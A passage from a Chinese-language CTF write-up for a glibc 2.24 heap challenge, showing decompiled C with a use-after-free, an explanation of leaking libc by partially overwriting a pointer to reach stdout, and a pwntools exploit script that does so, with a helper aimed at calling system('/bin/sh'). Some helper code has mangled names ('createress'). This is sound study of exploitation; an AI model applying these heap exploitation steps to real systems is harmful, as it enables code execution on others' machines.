  v3 <span class="token operator">=</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> chunk_number <span class="token operator">></span> <span class="token number">63</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    puts<span class="token punctuation">(</span><span class="token string">"No more memory available"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  puts<span class="token punctuation">(</span><span class="token string">"How much?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  printf<span class="token punctuation">(</span><span class="token string">"[+]> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  scanf<span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> nbytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> 0x70u <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    puts<span class="token punctuation">(</span><span class="token string">"Nope, too big"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbytes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> malloc<span class="token punctuation">(</span><span class="token punctuation">(</span>unsigned <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>nbytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  puts<span class="token punctuation">(</span><span class="token string">"Data?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>void <span class="token operator">**</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbytes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nbytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>nbytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbytes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  idx <span class="token operator">=</span> chunk_number<span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">;</span>
  chunk_list<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbytes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  puts<span class="token punctuation">(</span><span class="token string">"Job done!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

unsigned __int64 delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  unsigned <span class="token builtin">int</span> idx<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>4h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>Ch<span class="token punctuation">]</span> BYREF
  unsigned __int64 v2<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>8h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>8h<span class="token punctuation">]</span>

  v2 <span class="token operator">=</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span><span class="token punctuation">;</span>
  puts<span class="token punctuation">(</span><span class="token string">"Which one?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  printf<span class="token punctuation">(</span><span class="token string">"[+]> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  scanf<span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> idx <span class="token operator">></span> <span class="token number">0x3F</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    puts<span class="token punctuation">(</span><span class="token string">"Invalid index"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  free<span class="token punctuation">(</span><span class="token punctuation">(</span>void <span class="token operator">*</span><span class="token punctuation">)</span>chunk_list<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  puts<span class="token punctuation">(</span><span class="token string">"Job done!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span> <span class="token operator">^</span> v2<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>glibc 2.24，这个题非常困难，有uaf，但是泄露不出来地址，我知道要写stdout 打puts的利用链去泄露地址但是不知道怎么做，后面复现的时候发现可以通过堆风水让unsortedbin的fd和fastbin的fd重叠，main arena + 88离 stdout很近，libc地址低12位是固定的，覆盖两个字节就能到stdout，然后因为有size的检查，但是stdoutt往上一小段距离那有一个0x7f的地址可以通过错位字节分配到上面然后绕过这个检查，所以远程的话有十六分之一的概率能打通，需要爆破。申请到stdout后，把write base的低位覆盖，就可以通过puts的利用链去泄露libc。</p>
<p>具体的堆风水是，因为没有edit函数，可以通过在大堆块里面伪造fake chunk然后double free 让chunklist中有fakechunk的指针，伪造一个unsortedbin范围的fakechunk fakechunk和next chunk重叠，或者是大于，通过切分unsortedbin调整fd的位置，重叠后就可以利用了，记得把size改回去，因为重叠后unsortedbin切分的时候会写写size，也不能保证unsortedbin切分后size和原来相同，因为会分到fastbin</p>
<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">1</span>
IP <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>
PORT <span class="token operator">=</span> <span class="token number">9999</span>
elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./chall'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">create_ucontext</span><span class="token punctuation">(</span>
    src<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span>
    rsp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rbx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rbp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r12<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r13<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r14<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r15<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rsi<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rdi<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rcx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r8<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r9<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rdx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rip<span class="token operator">=</span><span class="token number">0xDEADBEEF</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytearray</span><span class="token punctuation">:</span>
    b <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0xE0</span><span class="token punctuation">:</span><span class="token number">0xE8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>src<span class="token punctuation">)</span>  <span class="token comment"># fldenv ptr</span>
    b<span class="token punctuation">[</span><span class="token number">0x1C0</span><span class="token punctuation">:</span><span class="token number">0x1C8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x1F80</span><span class="token punctuation">)</span>  <span class="token comment"># ldmxcsr</span>

    b<span class="token punctuation">[</span><span class="token number">0xA0</span><span class="token punctuation">:</span><span class="token number">0xA8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rsp<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x80</span><span class="token punctuation">:</span><span class="token number">0x88</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x78</span><span class="token punctuation">:</span><span class="token number">0x80</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x48</span><span class="token punctuation">:</span><span class="token number">0x50</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x50</span><span class="token punctuation">:</span><span class="token number">0x58</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r13<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x58</span><span class="token punctuation">:</span><span class="token number">0x60</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x60</span><span class="token punctuation">:</span><span class="token number">0x68</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span>

    b<span class="token punctuation">[</span><span class="token number">0xA8</span><span class="token punctuation">:</span><span class="token number">0xB0</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rip<span class="token punctuation">)</span>  <span class="token comment"># ret ptr</span>
    b<span class="token punctuation">[</span><span class="token number">0x70</span><span class="token punctuation">:</span><span class="token number">0x78</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x68</span><span class="token punctuation">:</span><span class="token number">0x70</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x98</span><span class="token punctuation">:</span><span class="token number">0xA0</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rcx<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x28</span><span class="token punctuation">:</span><span class="token number">0x30</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r8<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x30</span><span class="token punctuation">:</span><span class="token number">0x38</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r9<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x88</span><span class="token punctuation">:</span><span class="token number">0x90</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span>

    <span class="token keyword">return</span> b


<span class="token keyword">def</span> <span class="token function">setcontext32</span><span class="token punctuation">(</span>libc<span class="token punctuation">:</span> ELF<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    got <span class="token operator">=</span> libc<span class="token punctuation">.</span>createress <span class="token operator">+</span> libc<span class="token punctuation">.</span>dynamic_value_by_tag<span class="token punctuation">(</span><span class="token string">"DT_PLTGOT"</span><span class="token punctuation">)</span>
    plt_trampoline <span class="token operator">=</span> libc<span class="token punctuation">.</span>createress <span class="token operator">+</span> libc<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".plt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_creater
    <span class="token keyword">return</span> got<span class="token punctuation">,</span> flat<span class="token punctuation">(</span>
        p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>got <span class="token operator">+</span> <span class="token number">0x218</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"setcontext"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>plt_trampoline<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x40</span><span class="token punctuation">,</span>
        create_ucontext<span class="token punctuation">(</span>got <span class="token operator">+</span> <span class="token number">0x218</span><span class="token punctuation">,</span> rsp<span class="token operator">=</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"environ"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span>
<span class="token comment"># e.g. dest, payload = setcontext32.setcontext32(</span>
<span class="token comment">#         libc, rip=libc.sym["system"], rdi=libc.search(b"/bin/sh").__next__()</span>
<span class="token comment">#     )</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 0x70</span>
    sla<span class="token punctuation">(</span><span class="token string">b"[+]> "</span><span class="token punctuation">,</span><span class="token string">b"1"</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b"[+]> "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b"Data?"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b"[+]> "</span><span class="token punctuation">,</span><span class="token string">b"2"</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b"[+]> "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

create<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token string">b"fkchunk0"</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#0 # fkchunk0 = 0x555555605020</span>
create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"B"</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># 1</span>
create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"C"</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># 2</span>
create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"D"</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># 3</span>

delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b"\x20\x50"</span><span class="token punctuation">)</span> <span class="token comment"># 4</span>
create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"C"</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># 5</span>
create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"B"</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># 6</span>
create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"D"</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># 7 # fkchunk0</span>


delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
create<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xb1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 8</span>
delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token comment"># delete fkchunk0</span>

delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> 
create<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0X61</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 9 # segmentation unsortedbin and create fakechunk1 0x555555605040</span>
<span class="token comment"># # heap overlap chunk[1].fd = main_arena + 88</span>

<span class="token comment"># pwndbg> x /40gx 0x7ffff7bc2600 - 0x43</span>
<span class="token comment"># 0x7ffff7bc25bd &lt;_IO_2_1_stderr_+157>:	0xfff7bc1640000000	0x000000000000007f</span>
<span class="token comment"># 0x7ffff7bc25cd &lt;_IO_2_1_stderr_+173>:	0x0000000000000000	0x0000000000000000</span>
<span class="token comment"># 0x7ffff7bc25dd &lt;_IO_2_1_stderr_+189>:	0x0000000000000000	0x0000000000000000</span>
<span class="token comment"># 0x7ffff7bc25ed &lt;_IO_2_1_stderr_+205>:	0x0000000000000000	0xfff7bbe400000000</span>
<span class="token comment"># 0x7ffff7bc25fd &lt;_IO_2_1_stderr_+221>:	0x00fbad288700007f	0xfff7bc2683000000</span>
<span class="token comment"># 0x7ffff7bc260d &lt;_IO_2_1_stdout_+13>:	0xfff7bc268300007f	0xfff7bc268300007f</span>
<span class="token comment"># 0x7ffff7bc261d &lt;_IO_2_1_stdout_+29>:	0xfff7bc268300007f	0xfff7bc268300007f</span>
<span class="token comment"># 0x7ffff7bc262d &lt;_IO_2_1_stdout_+45>:	0xfff7bc268300007f	0xfff7bc268300007f</span>
<span class="token comment"># 0x7ffff7bc263d &lt;_IO_2_1_stdout_+61>:	0xfff7bc268400007f	0x000000000000007f</span>
<span class="token comment"># 0x7ffff7bc264d &lt;_IO_2_1_stdout_+77>:	0x0000000000000000	0x0000000000000000</span>
<span class="token comment"># 0x7ffff7bc265d &lt;_IO_2_1_stdout_+93>:	0x0000000000000000	0xfff7bc18c0000000</span>
<span class="token comment"># 0x7ffff7bc266d &lt;_IO_2_1_stdout_+109>:	0x000000000100007f	0xffffffffff000000</span>
<span class="token comment"># 0x7ffff7bc267d &lt;_IO_2_1_stdout_+125>:	0x000a000000ffffff	0xfff7bc3760000000</span>
<span class="token comment"># 0x7ffff7bc268d &lt;_IO_2_1_stdout_+141>:	0xffffffffff00007f	0x0000000000ffffff</span>
<span class="token comment"># 0x7ffff7bc269d &lt;_IO_2_1_stdout_+157>:	0xfff7bc1780000000	0x000000000000007f</span>
<span class="token comment"># 0x7ffff7bc26ad &lt;_IO_2_1_stdout_+173>:	0x0000000000000000	0x0000000000000000</span>


create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">b"\xbd\x25"</span><span class="token punctuation">)</span> <span class="token comment"># 10 # segmentation unsortedbin; chunk[1].fd = stdout</span>


create<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">b"E"</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># 11</span>
create<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">b"F"</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># 12</span>
delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>

create<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">b"\x40\x50"</span><span class="token punctuation">)</span> <span class="token comment"># 13</span>
create<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">b"D"</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># 14</span>
create<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">b"B"</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># 15</span>
create<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 16 # modify chunk[1].chunksize = 0x71</span>

create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"SSSSS"</span><span class="token punctuation">)</span> <span class="token comment"># 16</span>

payload <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">0x33</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#</span>
create<span class="token punctuation">(</span><span class="token number">0x61</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span> <span class="token comment"># 17</span>

rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3c2600</span>
